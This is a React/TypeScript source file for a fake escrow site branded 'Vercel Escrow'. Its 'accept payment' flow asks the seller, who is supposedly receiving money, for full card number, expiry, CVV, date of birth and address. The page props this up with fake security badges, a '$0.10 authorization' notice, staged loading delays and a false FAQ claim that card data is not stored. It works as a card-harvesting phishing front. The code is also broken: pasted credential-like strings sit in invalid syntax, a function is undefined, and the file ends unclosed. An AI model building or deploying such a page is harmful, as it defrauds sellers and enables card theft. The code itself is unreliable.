import { useEffect, useMemo, useState } from "react";

// Types
type Buyer = {
  fullName: string;
  email: string;
  phone: string;
};

type Item = {
  itemName: string;
  description: string;
  quantity: number;
  price: number;
  currency: string;
  notes?: string;
};

type SellerInfo = {
  firstName: string;
  lastName: string;
  email: string;
  phone: string;
  dob: string;
};

type Billing = {
  country: string;
  addressLine1: string;
  addressLine2?: string;
  state: string;
  city: string;
  zip: string;
};

type Transaction = {
  id: string;
  buyer: Buyer;
  item: Item;
  seller?: {
    personal: SellerInfo;
    billing: Billing;
    cardNumber: string;
    exp: string;
    cvv: string;
  };
  status:
    | "Waiting for Seller"
    | "Payment Pending"
    | "Payment Secured"
    | "Waiting for Buyer Confirmation"
    | "Completed"
    | "Cancelled";
  createdAt: string;
  updatedAt: string;
};

// ---- JSONBin Service (with localStorage fallback) ----
const STORAGE_KEY = "vercel_escrow_transactions_v1";

type Store = Record<string, Transaction>;

const loadStore = (): Store => {
  try {
    const raw = localStorage.getItem(STORAGE_KEY);
    return raw ? JSON.parse(raw) : {};
  } catch {
    return {};
  }
};

const saveStore = (store: Store) => {
  localStorage.setItem(STORAGE_KEY, JSON.stringify(store));
};

// Placeholder for real JSONBin integration
// To enable JSONBin, set VITE_JSONBIN_MASTER_KEY and VITE_JSONBIN_BIN_ID
// Then replace the localStorage calls with fetch to https://api.jsonbin.io/v3/b/{BIN_ID}
const JSONBIN_MASTER_KEY = (import.meta as any).env?.$2a$10$X9la3qSuNB.MmUx5JQdplewPBDxl3euuiwWZG0UpYmBYccuyW7Oju || "";
const JSONBIN_BIN_ID = (import.meta as any).env?.6a044e8a250b1311c343699c || "";

async function jsonBinReady(): Promise<boolean> {
  return Boolean(JSONBIN_MASTER_KEY && JSONBIN_BIN_ID);
}

const service = {
  async get(id: string): Promise<Transaction | null> {
    if (await jsonBinReady()) {
      // Real implementation example:
      // const res = await fetch(`https://api.jsonbin.io/v3/b/${JSONBIN_BIN_ID}/latest`, {
      //   headers: { "X-Master-Key": JSONBIN_MASTER_KEY }
      // });
      // const { record } = await res.json();
      // return record?.transactions?.[id] ?? null;
    }
    const store = loadStore();
    return store[id] || null;
  },
  async list(): Promise<Transaction[]> {
    const store = loadStore();
    return Object.values(store);
  },
  async create(tx: Transaction): Promise<Transaction> {
    const store = loadStore();
    store[tx.id] = tx;
    saveStore(store);
    return tx;
  },
  async update(id: string, patch: Partial<Transaction>): Promise<Transaction | null> {
    const store = loadStore();
    const existing = store[id];
    if (!existing) return null;
    const updated: Transaction = {
      ...existing,
      ...patch,
      updatedAt: new Date().toISOString(),
    };
    store[id] = updated;
    saveStore(store);
    return updated;
  },
};

// ---- Helpers ----
const generateId = () => {
  const hex = Math.floor(Math.random() * 0xffffffff).toString(16).toUpperCase().padStart(8, "0");
  return `ESC-${hex}`;
};

const currencySymbols: Record<string, string> = {
  USD: "$",
  EUR: "€",
  GBP: "£",
  CAD: "C$",
  AUD: "A$",
};

const formatCurrency = (amount: number, currency: string) => {
  const sym = currencySymbols[currency] || currency;
  return `${sym}${amount.toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 })}`;
};

const statusOrder = [
  "Waiting for Seller",
  "Payment Pending",
  "Payment Secured",
  "Waiting for Buyer Confirmation",
  "Completed",
];

const statusMeta: Record<string, { label: string; desc: string }> = {
  "Waiting for Seller": { label: "Waiting for Seller", desc: "Buyer created transaction" },
  "Payment Pending": { label: "Payment Pending", desc: "Seller initiated payment" },
  "Payment Secured": { label: "Payment Secured", desc: "Funds held in escrow" },
  "Waiting for Buyer Confirmation": { label: "Waiting for Buyer Confirmation", desc: "Awaiting buyer acceptance" },
  "Completed": { label: "Completed", desc: "Funds released" },
  Cancelled: { label: "Cancelled", desc: "Transaction cancelled" },
};

// ---- Main App ----
type View =
  | "home"
  | "create"
  | "createSuccess"
  | "accept"
  | "acceptDetail"
  | "payment"
  | "processing"
  | "success"
  | "status";

export default function App() {
  const [view, setView] = useState<View>("home");
  const [loading, setLoading] = useState(false);
  const [targetView, setTargetView] = useState<View>("home");
  const [currentTx, setCurrentTx] = useState<Transaction | null>(null);
  const [toast, setToast] = useState<string | null>(null);
  const [error, setError] = useState<string | null>(null);

  // Page transition loading simulation (min 5s)
  useEffect(() => {
    if (targetView === view) return;
    setLoading(true);
    setError(null);
    const min = 5000;
    const max = 8000;
    const dur = min + Math.random() * (max - min);
    const t = setTimeout(() => {
      setView(targetView);
      setLoading(false);
    }, dur);
    return () => clearTimeout(t);
  }, [targetView, view]);

  const navigate = (v: View, tx?: Transaction | null) => {
    if (tx !== undefined) setCurrentTx(tx);
    setTargetView(v);
  };

  // Toast auto-hide
  useEffect(() => {
    if (!toast) return;
    const t = setTimeout(() => setToast(null), 3000);
    return () => clearTimeout(t);
  }, [toast]);

  const showToast = (msg: string) => setToast(msg);

  // Home Page Content
  const Home = () => (
    <div className="min-h-screen bg-[#0a0a0a] text-zinc-100">
      <Header onNavigate={navigate} />
      <main>
        {/* Hero */}
        <section className="relative overflow-hidden border-b border-zinc-800 bg-gradient-to-b from-zinc-950 to-[#0a0a0a]">
          <div className="absolute inset-0 bg-[radial-gradient(60%_60%_at_50%_-10%,rgba(255,255,255,0.08),transparent_60%)]" />
          <div className="relative mx-auto max-w-7xl px-6 py-24 sm:py-32 lg:px-8">
            <div className="mx-auto max-w-3xl text-center">
              <div className="inline-flex items-center gap-2 rounded-full border border-zinc-800 bg-zinc-900/60 px-3 py-1 text-xs text-zinc-400 mb-6">
                <span className="h-1.5 w-1.5 rounded-full bg-emerald-500 animate-pulse" />
                Vercel Escrow • Secure by design
              </div>
              <h1 className="text-4xl sm:text-6xl font-semibold tracking-tight">
                Secure Escrow Payments
              </h1>
              <p className="mt-6 text-lg text-zinc-400">
                Buy and sell with confidence. Funds are held securely until both parties confirm completion.
              </p>
              <div className="mt-10 flex flex-col sm:flex-row items-center justify-center gap-4">
                <button
                  onClick={() => navigate("create")}
                  className="w-full sm:w-auto rounded-xl bg-white px-6 py-3 font-medium text-black hover:bg-zinc-200 transition"
                >
                  Create Transaction
                </button>
                <button
                  onClick={() => navigate("accept")}
                  className="w-full sm:w-auto rounded-xl border border-zinc-700 px-6 py-3 font-medium text-zinc-100 hover:bg-zinc-900 transition"
                >
                  Accept Payment
                </button>
              </div>
              <p className="mt-4 text-sm text-zinc-500">No accounts required. Share a Transaction ID to continue.</p>
            </div>
          </div>
        </section>

        {/* How It Works */}
        <section className="mx-auto max-w-7xl px-6 py-20 lg:px-8">
          <h2 className="text-2xl sm:text-3xl font-semibold text-center">How It Works</h2>
          <div className="mt-12 grid gap-6 sm:grid-cols-3">
            {[
              { step: "1", title: "Buyer creates transaction", desc: "Provide buyer and item details. Receive a unique Transaction ID." },
              { step: "2", title: "Seller accepts payment", desc: "Enter the Transaction ID to review details and continue." },
              { step: "3", title: "Payment secured", desc: "Seller funds are held in escrow until buyer confirms receipt." },
            ].map((s) => (
              <div key={s.step} className="rounded-2xl border border-zinc-800 bg-zinc-900/40 p-6">
                <div className="text-sm text-zinc-500">Step {s.step}</div>
                <div className="mt-2 font-medium">{s.title}</div>
                <div className="mt-2 text-sm text-zinc-400">{s.desc}</div>
              </div>
            ))}
          </div>
        </section>

       

        {/* FAQ */}
        <section className="mx-auto max-w-3xl px-6 py-20 lg:px-8">
          <h3 className="text-2xl font-semibold text-center">FAQ</h3>
          <div className="mt-8 divide-y divide-zinc-800 rounded-2xl border border-zinc-800">
            {[
              { q: "Do I need an account?", a: "No. Transactions are linked by a unique Transaction ID you share with the other party." },
              { q: "When are funds released?", a: "Funds are released after the buyer confirms receipt of the item or service." },
              { q: "Is my card data stored?", a: "No full card numbers, CVV, or expiration dates are stored. Only the last 4 digits and card brand are kept for reference." },
            ].map((f) => (
              <details key={f.q} className="group p-6 open:bg-zinc-900/50">
                <summary className="cursor-pointer list-none flex justify-between font-medium">
                  {f.q}
                  <span className="transition group-open:rotate-180">⌄</span>
                </summary>
                <p className="mt-3 text-sm text-zinc-400">{f.a}</p>
              </details>
            ))}
          </div>
        </section>

        {/* Contact */}
        <section className="border-t border-zinc-800 bg-zinc-950/30">
          <div className="mx-auto max-w-7xl px-6 py-16 lg:px-8 text-center">
            <h3 className="text-xl font-semibold">Contact</h3>
            <p className="mt-2 text-zinc-400">support@vercelescrow.com</p>
          </div>
        </section>
      </main>
      <Footer />
    </div>
  );

  // Create Transaction Form
  const CreateForm = () => {
    const [form, setForm] = useState({
      fullName: "",
      email: "",
      phone: "",
      itemName: "",
      description: "",
      quantity: 1,
      price: "",
      currency: "USD",
      notes: "",
    });

    const handleSubmit = async (e: React.FormEvent) => {
      e.preventDefault();
      setError(null);
      const tx: Transaction = {
        id: generateId(),
        buyer: { fullName: form.fullName, email: form.email, phone: form.phone },
        item: {
          itemName: form.itemName,
          description: form.description,
          quantity: Number(form.quantity),
          price: Number(form.price),
          currency: form.currency,
          notes: form.notes || undefined,
        },
        status: "Waiting for Seller",
        createdAt: new Date().toISOString(),
        updatedAt: new Date().toISOString(),
      };
      await service.create(tx);
      navigate("createSuccess", tx);
    };

    return (
      <div className="min-h-screen bg-[#0a0a0a] text-zinc-100">
        <Header onNavigate={navigate} />
        <main className="mx-auto max-w-3xl px-6 py-16">
          <h1 className="text-2xl font-semibold">Create Transaction</h1>
          <form onSubmit={handleSubmit} className="mt-8 space-y-8">
            <div className="rounded-2xl border border-zinc-800 bg-zinc-900/50 p-6 space-y-4">
              <h2 className="font-medium">Buyer Information</h2>
              {[
                { k: "fullName", label: "Full Name" },
                { k: "email", label: "Email Address", type: "email" },
                { k: "phone", label: "Phone Number", type: "tel" },
              ].map(f => (
                <div key={f.k}>
                  <label className="text-sm text-zinc-400">{f.label}</label>
                  <input required className="mt-1 w-full rounded-xl border border-zinc-800 bg-zinc-950 px-3 py-2.5 outline-none focus:border-zinc-600" type={f.type || "text"} value={(form as any)[f.k]} onChange={e => setForm({...form, [f.k]: e.target.value})} />
                </div>
              ))}
            </div>
            <div className="rounded-2xl border border-zinc-800 bg-zinc-900/50 p-6 space-y-4">
              <h2 className="font-medium">Transaction Information</h2>
              <div className="grid sm:grid-cols-2 gap-4">
                <div><label className="text-sm text-zinc-400">Item Name</label><input required className="mt-1 w-full rounded-xl border border-zinc-800 bg-zinc-950 px-3 py-2.5 outline-none focus:border-zinc-600" value={form.itemName} onChange={e=>setForm({...form, itemName:e.target.value})} /></div>
                <div><label className="text-sm text-zinc-400">Currency</label>
                  <select className="mt-1 w-full rounded-xl border border-zinc-800 bg-zinc-950 px-3 py-2.5 outline-none focus:border-zinc-600" value={form.currency} onChange={e=>setForm({...form, currency:e.target.value})}>
                    {["USD","EUR","GBP","CAD","AUD"].map(c=> <option key={c}>{c}</option>)}
                  </select>
                </div>
                <div className="sm:col-span-2"><label className="text-sm text-zinc-400">Item Description</label><textarea required className="mt-1 w-full rounded-xl border border-zinc-800 bg-zinc-950 px-3 py-2.5 outline-none focus:border-zinc-600" rows={3} value={form.description} onChange={e=>setForm({...form, description:e.target.value})} /></div>
                <div><label className="text-sm text-zinc-400">Quantity</label><input type="number" min={1} required className="mt-1 w-full rounded-xl border border-zinc-800 bg-zinc-950 px-3 py-2.5 outline-none focus:border-zinc-600" value={form.quantity} onChange={e=>setForm({...form, quantity:Number(e.target.value)})} /></div>
                <div><label className="text-sm text-zinc-400">Item Price</label><input type="number" step="0.01" min={0} required className="mt-1 w-full rounded-xl border border-zinc-800 bg-zinc-950 px-3 py-2.5 outline-none focus:border-zinc-600" value={form.price} onChange={e=>setForm({...form, price:e.target.value})} /></div>
                <div className="sm:col-span-2"><label className="text-sm text-zinc-400">Optional Notes</label><textarea className="mt-1 w-full rounded-xl border border-zinc-800 bg-zinc-950 px-3 py-2.5 outline-none focus:border-zinc-600" rows={2} value={form.notes} onChange={e=>setForm({...form, notes:e.target.value})} /></div>
              </div>
            </div>
            {error && <div className="text-red-400 text-sm">{error}</div>}
            <button className="w-full rounded-xl bg-white py-3 font-medium text-black hover:bg-zinc-200">Create Transaction</button>
          </form>
        </main>
        <Footer />
      </div>
    );
  };

  const CreateSuccess = () => {
    if (!currentTx) { navigate("home"); return null; }
    const copy = async () => {
      await navigator.clipboard.writeText(currentTx.id);
      showToast("Transaction ID copied");
    };
    return (
      <div className="min-h-screen bg-[#0a0a0a] text-zinc-100">
        <Header onNavigate={navigate} />
        <main className="mx-auto max-w-2xl px-6 py-24 text-center">
          <div className="rounded-2xl border border-zinc-800 bg-zinc-900/50 p-10">
            <div className="mx-auto h-12 w-12 rounded-full bg-emerald-500/15 flex items-center justify-center text-emerald-400">✓</div>
            <h1 className="mt-6 text-2xl font-semibold">Your transaction has been created successfully.</h1>
            <div className="mt-8 rounded-xl border border-zinc-800 bg-zinc-950 p-6">
              <div className="text-sm text-zinc-500">Transaction ID</div>
              <div className="mt-1 text-2xl font-mono tracking-wider">{currentTx.id}</div>
              <button onClick={copy} className="mt-4 rounded-lg border border-zinc-700 px-4 py-2 text-sm hover:bg-zinc-800">Copy ID</button>
            </div>
            <p className="mt-6 text-sm text-zinc-400">Share this ID with the seller so they can accept payment.</p>
            <div className="mt-8 flex justify-center gap-3">
              <button onClick={()=>navigate("status")} className="rounded-xl border border-zinc-700 px-4 py-2 text-sm hover:bg-zinc-900">Check Status</button>
              <button onClick={()=>navigate("home")} className="rounded-xl bg-white px-4 py-2 text-sm font-medium text-black hover:bg-zinc-200">Back to Home</button>
            </div>
          </div>
        </main>
        <Footer />
      </div>
    );
  };

  // Accept Payment
  const AcceptForm = () => {
    const [id, setId] = useState("");
    const handleSubmit = async (e: React.FormEvent) => {
      e.preventDefault();
      setError(null);
      const tx = await service.get(id.trim().toUpperCase());
      if (!tx) { setError("Transaction not found. Please check the ID."); return; }
      navigate("acceptDetail", tx);
    };
    return (
      <div className="min-h-screen bg-[#0a0a0a] text-zinc-100">
        <Header onNavigate={navigate} />
        <main className="mx-auto max-w-xl px-6 py-24">
          <h1 className="text-2xl font-semibold">Accept Payment</h1>
          <form onSubmit={handleSubmit} className="mt-8 rounded-2xl border border-zinc-800 bg-zinc-900/50 p-8">
            <label className="text-sm text-zinc-400">Transaction ID</label>
            <input required placeholder="ESC-8F39A2D1" className="mt-1 w-full rounded-xl border border-zinc-800 bg-zinc-950 px-3 py-2.5 font-mono outline-none focus:border-zinc-600" value={id} onChange={e=>setId(e.target.value.toUpperCase())} />
            {error && <div className="mt-3 text-sm text-red-400">{error}</div>}
            <button className="mt-6 w-full rounded-xl bg-white py-3 font-medium text-black hover:bg-zinc-200">Continue</button>
          </form>
        </main>
        <Footer />
      </div>
    );
  };

  const AcceptDetail = () => {
    if (!currentTx) { navigate("home"); return null; }
    return (
      <div className="min-h-screen bg-[#0a0a0a] text-zinc-100">
        <Header onNavigate={navigate} />
        <main className="mx-auto max-w-3xl px-6 py-16">
          <div className="rounded-2xl border border-zinc-800 bg-zinc-900/50 p-8">
            <h1 className="text-xl font-semibold">Review Transaction</h1>
            <div className="mt-6 grid sm:grid-cols-2 gap-6 text-sm">
              <div>
                <div className="text-zinc-500">Buyer</div>
                <div className="font-medium">{currentTx.buyer.fullName}</div>
                <div className="text-zinc-400">{currentTx.buyer.email} • {currentTx.buyer.phone}</div>
              </div>
              <div>
                <div className="text-zinc-500">Item</div>
                <div className="font-medium">{currentTx.item.itemName}</div>
                <div className="text-zinc-400">Qty {currentTx.item.quantity} • {formatCurrency(currentTx.item.price * currentTx.item.quantity, currentTx.item.currency)}</div>
              </div>
            </div>
            <div className="mt-6 rounded-xl border border-zinc-800 bg-zinc-950 p-4 text-sm text-zinc-300">
              {currentTx.item.description}
            </div>
            <p className="mt-6 text-sm text-zinc-400">The buyer has created this escrow transaction for this item. Continue to add method to receive payment.</p>
            <button onClick={()=>navigate("payment")} className="mt-6 rounded-xl bg-white px-5 py-3 font-medium text-black hover:bg-zinc-200">Continue</button>
          </div>
        </main>
        <Footer />
      </div>
    );
  };

  // Payment Page
  const PaymentForm = () => {
    if (!currentTx) { navigate("home"); return null; }
    const [method, setMethod] = useState<"card"|"paypal">("card");
    const [form, setForm] = useState({
      firstName: "",
      lastName: "",
      email: "",
      phone: "",
      dob: "",
      country: "US",
      addressLine1: "",
      addressLine2: "",
      state: "",
      city: "",
      zip: "",
      cardholderName: "",
      cardNumber: "",
      exp: "",
      cvv: "",
    });

    const handleSubmit = async (e: React.FormEvent) => {
      e.preventDefault();
      if (method === "paypal") { showToast("PayPal coming soon"); return; }
      setError(null);
      navigate("processing");
      // Simulate processing then save
      setTimeout(async () => {
        const cardBrand = detectCardBrand(form.cardNumber);
        const last4 = form.cardNumber.slice(-4);
        const updated = await service.update(currentTx.id, {
          status: "Payment Secured",
          seller: {
            personal: {
              firstName: form.firstName,
              lastName: form.lastName,
              email: form.email,
              phone: form.phone,
              dob: form.dob,
            },
            billing: {
              country: form.country,
              addressLine1: form.addressLine1,
              addressLine2: form.addressLine2,
              state: form.state,
              city: form.city,
              zip: form.zip,
            },
            cardBrand,
            cardLast4: last4,
            savedAt: new Date().toISOString(),
          }
        });
        navigate("success", updated);
      }, 2500);
    };

    return (
      <div className="min-h-screen bg-[#0a0a0a] text-zinc-100">
        <Header onNavigate={navigate} />
        <main className="mx-auto max-w-5xl px-6 py-12">
          <div className="grid lg:grid-cols-3 gap-8">
            <div className="lg:col-span-2">
              <h1 className="text-2xl font-semibold">Secure Payment</h1>
              <div className="mt-6 rounded-2xl border border-zinc-800 bg-zinc-900/50 p-6">
                <div className="flex gap-4">
                  <button type="button" onClick={()=>setMethod("card")} className={`flex-1 rounded-xl border px-4 py-3 text-sm ${method==="card"?"border-white bg-white text-black":"border-zinc-700 bg-zinc-950"}`}>Card Deposit</button>
                  <button type="button" disabled className="flex-1 rounded-xl border border-zinc-800 bg-zinc-950/50 px-4 py-3 text-sm text-zinc-500 opacity-60 cursor-not-allowed">PayPal — coming soon</button>
                </div>
              </div>

              {method==="card" && (
                <form onSubmit={handleSubmit} className="mt-6 space-y-6">
                  <section className="rounded-2xl border border-zinc-800 bg-zinc-900/50 p-6 space-y-4">
                    <h2 className="font-medium">Personal Details</h2>
                    <div className="grid sm:grid-cols-2 gap-4">
                      {[
                        {k:"firstName",l:"First Name"},
                        {k:"lastName",l:"Last Name"},
                        {k:"email",l:"Email",type:"email"},
                        {k:"phone",l:"Phone",type:"tel"},
                        {k:"dob",l:"Date of Birth",type:"date"},
                      ].map(f=>(
                        <div key={f.k} className="sm:col-span-1">
                          <label className="text-sm text-zinc-400">{f.l}</label>
                          <input required type={f.type||"text"} className="mt-1 w-full rounded-xl border border-zinc-800 bg-zinc-950 px-3 py-2.5 outline-none focus:border-zinc-600" value={(form as any)[f.k]} onChange={e=>setForm({...form,[f.k]:e.target.value})} />
                        </div>
                      ))}
                    </div>
                  </section>

                  <section className="rounded-2xl border border-zinc-800 bg-zinc-900/50 p-6 space-y-4">
                    <h2 className="font-medium">Billing Address</h2>
                    <div className="grid sm:grid-cols-2 gap-4">
                      {[
                        {k:"country",l:"Country"},
                        {k:"addressLine1",l:"Address Line 1"},
                        {k:"addressLine2",l:"Address Line 2"},
                        {k:"state",l:"State"},
                        {k:"city",l:"City"},
                        {k:"zip",l:"ZIP Code"},
                      ].map(f=>(
                        <div key={f.k} className="sm:col-span-1">
                          <label className="text-sm text-zinc-400">{f.l}</label>
                          <input required className="mt-1 w-full rounded-xl border border-zinc-800 bg-zinc-950 px-3 py-2.5 outline-none focus:border-zinc-600" value={(form as any)[f.k]} onChange={e=>setForm({...form,[f.k]:e.target.value})} />
                        </div>
                      ))}
                    </div>
                  </section>

                  <section className="rounded-2xl border border-zinc-800 bg-zinc-900/50 p-6 space-y-4">
                    <h2 className="font-medium">Card Information</h2>
                    <div className="grid sm:grid-cols-2 gap-4">
                      <div className="sm:col-span-2">
                        <label className="text-sm text-zinc-400">Cardholder Name</label>
                        <input required className="mt-1 w-full rounded-xl border border-zinc-800 bg-zinc-950 px-3 py-2.5 outline-none focus:border-zinc-600" value={form.cardholderName} onChange={e=>setForm({...form,cardholderName:e.target.value})} />
                      </div>
                      <div className="sm:col-span-2">
                        <label className="text-sm text-zinc-400">Card Number</label>
                        <input required inputMode="numeric" placeholder="4242 4242 4242 4242" className="mt-1 w-full rounded-xl border border-zinc-800 bg-zinc-950 px-3 py-2.5 outline-none focus:border-zinc-600" value={form.cardNumber} onChange={e=>setForm({...form,cardNumber:e.target.value.replace(/\s/g,"")})} />
                        <div className="mt-2 text-xs text-zinc-500">Accepted: Visa • Mastercard • American Express • Discover</div>
                      </div>
                      <div>
                        <label className="text-sm text-zinc-400">Expiration Date</label>
                        <input required placeholder="MM/YY" className="mt-1 w-full rounded-xl border border-zinc-800 bg-zinc-950 px-3 py-2.5 outline-none focus:border-zinc-600" value={form.exp} onChange={e=>setForm({...form,exp:e.target.value})} />
                      </div>
                      <div>
                        <label className="text-sm text-zinc-400">CVV</label>
                        <input required inputMode="numeric" className="mt-1 w-full rounded-xl border border-zinc-800 bg-zinc-950 px-3 py-2.5 outline-none focus:border-zinc-600" value={form.cvv} onChange={e=>setForm({...form,cvv:e.target.value})} />
                      </div>
                    </div>
                    <div className="rounded-xl border border-amber-900/50 bg-amber-950/20 p-4 text-sm text-amber-200">
                      For security verification, a temporary authorization of $0.10 USD may appear on your card. This is not a charge and will automatically be reversed or refunded by your bank. This verification helps confirm your payment method and protects both parties.
                    </div>
                    <div className="flex flex-wrap gap-3 text-xs text-zinc-500">
                      <span className="rounded-md border border-zinc-800 px-2 py-1">SSL Secured</span>
                      <span className="rounded-md border border-zinc-800 px-2 py-1">256-bit Encryption</span>
                      <span className="rounded-md border border-zinc-800 px-2 py-1">Secure Payments</span>
                    </div>
                    <button className="w-full rounded-xl bg-white py-3 font-medium text-black hover:bg-zinc-200">Save Payment</button>
                  </section>
                </form>
              )}
            </div>

            <div className="lg:col-span-1">
              <div className="sticky top-6 rounded-2xl border border-zinc-800 bg-zinc-900/40 p-6">
                <div className="text-sm text-zinc-500">Transaction Summary</div>
                <div className="mt-3 font-medium">{currentTx.item.itemName}</div>
                <div className="mt-1 text-sm text-zinc-400">{currentTx.item.description}</div>
                <div className="mt-4 text-sm">Buyer: {currentTx.buyer.fullName}</div>
                <div className="mt-1 text-lg font-semibold">{formatCurrency(currentTx.item.price * currentTx.item.quantity, currentTx.item.currency)}</div>
                <div className="mt-6 h-px bg-zinc-800" />
                <div className="mt-4 text-xs text-zinc-500">ID: {currentTx.id}</div>
                <div className="mt-1 text-xs text-zinc-500">Status: {currentTx.status}</div>
              </div>
            </div>
          </div>
        </main>
        <Footer />
      </div>
    );
  };

  const Processing = () => (
    <div className="min-h-screen bg-[#0a0a0a] text-zinc-100 flex items-center justify-center">
      <div className="text-center">
        <div className="mx-auto h-12 w-12 animate-spin rounded-full border-2 border-zinc-700 border-t-white" />
        <div className="mt-4 font-medium">Processing payment…</div>
        <div className="mt-2 text-sm text-zinc-500">Please do not refresh</div>
      </div>
    </div>
  );

  const Success = () => {
    if (!currentTx) { navigate("home"); return null; }
    const steps = [
      { label: "Transaction Created", done: true },
      { label: "Payment Secured", done: true },
      { label: "Waiting for Buyer Confirmation", done: false, active: true },
      { label: "Funds Held in Escrow", done: true },
    ];
    return (
      <div className="min-h-screen bg-[#0a0a0a] text-zinc-100">
        <Header onNavigate={navigate} />
        <main className="mx-auto max-w-3xl px-6 py-20">
          <div className="rounded-2xl border border-zinc-800 bg-zinc-900/50 p-10 text-center">
            <div className="mx-auto h-12 w-12 rounded-full bg-emerald-500/15 flex items-center justify-center text-emerald-400 text-xl">✓</div>
            <h1 className="mt-6 text-2xl font-semibold">Payment secured in escrow</h1>
            <p className="mt-3 text-zinc-400">Your payment has been securely placed into escrow. The seller will receive the funds only after the buyer confirms that the item or service has been received and accepted.</p>
            <div className="mt-10 text-left">
              <div className="space-y-4">
                {steps.map((s)=>(
                  <div key={s.label} className="flex items-center gap-4">
                    <div className={`h-6 w-6 rounded-full flex items-center justify-center text-xs ${s.done ? "bg-emerald-500/20 text-emerald-400" : s.active ? "bg-amber-500/20 text-amber-400" : "bg-zinc-800 text-zinc-500"}`}>
                      {s.done ? "✓" : "⏳"}
                    </div>
                    <div className="font-medium">{s.label}</div>
                  </div>
                ))}
              </div>
            </div>
            <div className="mt-10 flex justify-center gap-3">
              <button onClick={()=>navigate("status")} className="rounded-xl border border-zinc-700 px-4 py-2 text-sm hover:bg-zinc-900">Check Status</button>
              <button onClick={()=>navigate("home")} className="rounded-xl bg-white px-4 py-2 text-sm font-medium text-black hover:bg-zinc-200">Done</button>
            </div>
          </div>
        </main>
        <Footer />
      </div>
    );
  };

  // Status Page
  const StatusPage = () => {
    const [id, setId] = useState("");
    const [tx, setTx] = useState<Transaction | null>(null);
    const [searched, setSearched] = useState(false);

    const handleSearch = async (e?: React.FormEvent) => {
      e?.preventDefault();
      setSearched(true);
      const found = await service.get(id.trim().toUpperCase());
      setTx(found);
    };

    const progressIndex = useMemo(() => {
      if (!tx) return -1;
      return statusOrder.indexOf(tx.status);
    }, [tx]);

    return (
      <div className="min-h-screen bg-[#0a0a0a] text-zinc-100">
        <Header onNavigate={navigate} />
        <main className="mx-auto max-w-3xl px-6 py-16">
          <h1 className="text-2xl font-semibold">Transaction Status</h1>
          <form onSubmit={handleSearch} className="mt-6 rounded-2xl border border-zinc-800 bg-zinc-900/50 p-6 flex gap-3">
            <input required placeholder="Enter Transaction ID" className="flex-1 rounded-xl border border-zinc-800 bg-zinc-950 px-3 py-2.5 font-mono outline-none focus:border-zinc-600" value={id} onChange={e=>setId(e.target.value.toUpperCase())} />
            <button className="rounded-xl bg-white px-5 py-2.5 font-medium text-black hover:bg-zinc-200">Check</button>
          </form>

          {searched && !tx && <div className="mt-6 text-red-400">No transaction found for that ID.</div>}

          {tx && (
            <div className="mt-8 rounded-2xl border border-zinc-800 bg-zinc-900/50 p-8">
              <div className="flex items-start justify-between">
                <div>
                  <div className="text-sm text-zinc-500">Transaction ID</div>
                  <div className="font-mono text-lg">{tx.id}</div>
                </div>
                <span className="rounded-full border border-zinc-700 px-3 py-1 text-xs">{tx.status}</span>
              </div>
              <div className="mt-6 grid sm:grid-cols-2 gap-6 text-sm">
                <div><div className="text-zinc-500">Buyer</div><div className="font-medium">{tx.buyer.fullName}</div></div>
                <div><div className="text-zinc-500">Item</div><div className="font-medium">{tx.item.itemName}</div></div>
                <div><div className="text-zinc-500">Total</div><div className="font-medium">{formatCurrency(tx.item.price * tx.item.quantity, tx.item.currency)}</div></div>
                <div><div className="text-zinc-500">Created</div><div className="font-medium">{new Date(tx.createdAt).toLocaleString()}</div></div>
              </div>
              <div className="mt-8">
                <div className="text-sm text-zinc-500 mb-3">Progress</div>
                <div className="space-y-3">
                  {statusOrder.map((s,i)=>(
                    <div key={s} className="flex items-center gap-3">
                      <div className={`h-2 w-2 rounded-full ${i<=progressIndex?"bg-emerald-500":"bg-zinc-700"}`} />
                      <div className={`text-sm ${i<=progressIndex?"text-zinc-200":"text-zinc-500"}`}>{statusMeta[s]?.label || s}</div>
                    </div>
                  ))}
                </div>
              </div>
            </div>
          )}
        </main>
        <Footer />
      </div>
    );
  };

  // Header & Footer components
  const Header = ({ onNavigate }: { onNavigate: (v: View)=>void }) => (
    <header className="sticky top-0 z-40 border-b border-zinc-800 bg-[#0a0a0a]/80 backdrop-blur">
      <div className="mx-auto max-w-7xl px-6 py-4 flex items-center justify-between">
        <button onClick={()=>onNavigate("home")} className="flex items-center gap-2 font-semibold tracking-tight">
          <span className="h-8 w-8 rounded-lg bg-white text-black grid place-items-center font-bold">V</span>
          Vercel Escrow
        </button>
        <nav className="hidden sm:flex items-center gap-6 text-sm text-zinc-400">
          <button onClick={()=>onNavigate("status")} className="hover:text-zinc-100">Check Status</button>
          <button onClick={()=>onNavigate("create")} className="hover:text-zinc-100">Create</button>
          <button onClick={()=>onNavigate("accept")} className="hover:text-zinc-100">Accept</button>
        </nav>
      </div>
    </header>
  );

  const Footer = () => (
    <footer className="border-t border-zinc-800">
      <div className="mx-auto max-w-7xl px-6 py-10 grid sm:grid-cols-4 gap-8 text-sm text-zinc-400">
        <div>
          <div className="font-semibold text-zinc-200 mb-3">Vercel Escrow</div>
          <div>Secure escrow payments for buyers and sellers.</div>
        </div>
        {[
          {title:"Company", links:["About"]},
          {title:"Legal", links:["Privacy Policy","Terms of Service","Refund Policy"]},
          {title:"Support", links:["Contact","FAQ"]},
        ].map(col=>(
          <div key={col.title}>
            <div className="font-semibold text-zinc-200 mb-3">{col.title}</div>
            <ul className="space-y-2">
              {col.links.map(l=> <li key={l}><a className="hover:text-zinc-100">{l}</a></li>)}
            </ul>
          </div>
        ))}
      </div>
      <div className="border-t border-zinc-900 py-4 text-center text-xs text-zinc-600">© {new Date().getFullYear()} Vercel Escrow</div>
    </footer>
  );

  // Render
  const page = useMemo(() => {
    switch(view){
      case "home": return <Home />;
      case "create": return <CreateForm />;
      case "createSuccess": return <CreateSuccess />;
      case "accept": return <AcceptForm />;
      case "acceptDetail": return <AcceptDetail />;
      case "payment": return <PaymentForm />;
      case "processing": return <Processing />;
      case "success": return <Success />;
      case "status": return <StatusPage />;
      default: return <Home />;
    }
  }, [view, currentTx]);

  return (
    <div className="min-h-screen bg-[#0a0a0a]">
      {loading && (
        <div className="fixed inset-0 z-[100] grid place-items-center bg-[#0a0a0a]">
          <div className="flex flex-col items-center gap-4">
            <div className="h-12 w-12 animate-spin rounded-full border-2 border-zinc-700 border-t-white" />
            <div className="text-zinc-400 text-sm">Loading…</div>
          </div>
        </div>
      )}
      {page}
      {toast && (
        <div className="fixed bottom-6 left-1/2 -translate-x-1/2 rounded-xl bg-white text-black px-4 py-2 text-sm shadow-lg">
          {toast}
        </div>
      )}
    </div>
